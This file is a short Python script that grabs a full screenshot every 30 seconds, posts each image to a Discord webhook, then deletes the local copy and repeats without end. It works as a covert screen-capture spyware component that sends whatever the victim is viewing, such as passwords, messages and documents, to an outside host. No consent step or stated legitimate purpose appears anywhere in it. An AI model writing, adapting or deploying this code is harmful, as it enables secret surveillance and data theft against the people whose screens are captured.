import time
import os
import requests
from PIL import ImageGrab

# Set your webhook url here
WEBHOOK_URL = "https://discordapp.com/api/webhooks/"

# Set the interval between screenshots (in seconds) here
INTERVAL = 30

while True:
    # Take a screenshot
    screenshot = ImageGrab.grab()

    # Save the screenshot to a file
    screenshot_filename = "screenshot.png"
    screenshot.save(screenshot_filename)

    # Send the screenshot to the webhook
    with open(screenshot_filename, "rb") as f:
        file = {"file": f}
        payload = {"content": "Screenshot taken at {}".format(time.strftime("%Y-%m-%d %H:%M:%S"))}
        r = requests.post(WEBHOOK_URL, data=payload, files=file)

    # Delete the screenshot file
    os.remove(screenshot_filename)

    # Wait for the specified interval
    time.sleep(INTERVAL)
